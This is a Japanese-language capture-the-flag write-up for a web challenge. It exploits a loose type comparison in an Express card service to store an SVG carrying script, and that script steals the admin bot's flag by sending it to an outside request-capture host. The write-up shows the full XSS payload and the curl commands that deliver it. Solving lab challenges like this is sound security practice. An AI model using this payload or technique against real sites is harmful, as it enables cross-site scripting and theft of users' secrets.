# hallmark:web:80pts
Send your loved ones a [Hallmark card](https://hallmark.web.actf.co/)! Maybe even send one to the [admin](https://admin-bot.actf.co/hallmark) 😳.  
[Source code](dist.tar.gz)  

# Solution
リンクとソースが渡される。  
アクセスすると個別のuuidを用いたページにHallmark cardを作成できるサービスのようだ。  
![site1.png](site/site1.png)  
カードはCustom Textのほかに、いくつかの画像を選択できる。  
[Heart](site/site2.png)  
[Snowman](site/site3.png)  
[Flowers](site/site4.png)  
[Cake](site/site5.png)  
いつものAdmin BotがあることからXSSであろうと予測できる。  
ひとまずCustom TextでXSSを試すが、`Content-Type: text/plain`であるので発火しない。  
ソースを見ると以下のようであった。  
```js
~~~
const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());

const IMAGES = {
    heart: fs.readFileSync("./static/heart.svg"),
    snowman: fs.readFileSync("./static/snowman.svg"),
    flowers: fs.readFileSync("./static/flowers.svg"),
    cake: fs.readFileSync("./static/cake.svg")
};
~~~
app.get("/card", (req, res) => {
    if (req.query.id && cards[req.query.id]) {
        res.setHeader("Content-Type", cards[req.query.id].type);
        res.send(cards[req.query.id].content);
    } else {
        res.send("bad id");
    }
});

app.post("/card", (req, res) => {
    let { svg, content } = req.body;

    let type = "text/plain";
    let id = v4();

    if (svg === "text") {
        type = "text/plain";
        cards[id] = { type, content }
    } else {
        type = "image/svg+xml";
        cards[id] = { type, content: IMAGES[svg] }
    }

    res.redirect("/card?id=" + id);
});

app.put("/card", (req, res) => {
    let { id, type, svg, content } = req.body;

    if (!id || !cards[id]){
        res.send("bad id");
        return;
    }

    cards[id].type = type == "image/svg+xml" ? type : "text/plain";
    cards[id].content = type === "image/svg+xml" ? IMAGES[svg || "heart"] : content;

    res.send("ok");
});


// the admin bot will be able to access this
app.get("/flag", (req, res) => {
    if (req.cookies && req.cookies.secret === secret) {
        res.send(flag);
    } else {
        res.send("you can't view this >:(");
    }
});
~~~
```
POSTでカードを作成、GETで閲覧、PUTで変更する機能がある。  
カード画像はsvgのようで、`Content-Type: image/svg+xml`となり、種類はあらかじめ決められている。  
ここで方針として、Custom TextのContent-Typeを書き換えるか、`Content-Type: image/svg+xml`の状態でsvgを書き換えるかのどちらかを狙う。  
前者は`cards[id].type`に任意の文字列を入れることは難しそうであり、後者も`"text/plain"`以外では決まったsvgとなるため、同様に難しそうである。  
ここで`app.use(bodyParser.urlencoded({ extended: true }));`が怪しく、おそらく配列で何とかするのだろうと予測がつく。  
よくソースを見ると、PUTの`cards[id].type = type == "image/svg+xml" ? type : "text/plain";`のみ厳密な比較でない。  
この入力に`["image/svg+xml"]`などを渡してやれば、次の厳密な比較の`cards[id].content = type === "image/svg+xml" ? IMAGES[svg || "heart"] : content;`でsvgでないと判定され、自由に内容を書き換えられることに気づく。  
あとはsvgでのXSSを行えばよい。  
以下のペイロードを用いる(リクエスト受信サーバにはRequestBin.comを利用)。  
```xml
<?xml version="1.0" encoding="utf-8"?>
<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 864 864" style="enable-background:new 0 0 864 864;" xml:space="preserve">
<script>
fetch("/flag")
    .then((response) => response.text())
    .then((text) => location.href="https://enxh1c9lp9m1.x.pipedream.net/?s="+text);
</script>
</svg>
```
カードを作成して、変更することで`/flag`をfetchしてやる。  
```bash
$ curl -X POST https://hallmark.web.actf.co/card -d 'svg=text&content=satoki'
Found. Redirecting to /card?id=78016e26-b8e0-4f9f-844f-01bc03ebd315
$ curl -X PUT  https://hallmark.web.actf.co/card -d 'id=78016e26-b8e0-4f9f-844f-01bc03ebd315&type[]=image/svg%2Bxml&svg=satoki&content=<?xml version="1.0" encoding="utf-8"?>
<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 864 864" style="enable-background:new 0 0 864 864;" xml:space="preserve">
<script>
fetch("/flag")
    .then((response) => response.text())
    .then((text) => location.href="https://enxh1c9lp9m1.x.pipedream.net/?s="%2Btext);
</script>
</svg>'
ok
```
これでXSSするURL (`https://hallmark.web.actf.co/card?id=78016e26-b8e0-4f9f-844f-01bc03ebd315`) が完成したので、Admin Botに投げてやる。  
受信サーバでは以下のリクエストが到達する。  
```
GET
/?s=actf{the_adm1n_has_rece1ved_y0ur_card_cefd0aac23a38d33}
```
flagが得られた。  

## actf{the_adm1n_has_rece1ved_y0ur_card_cefd0aac23a38d33}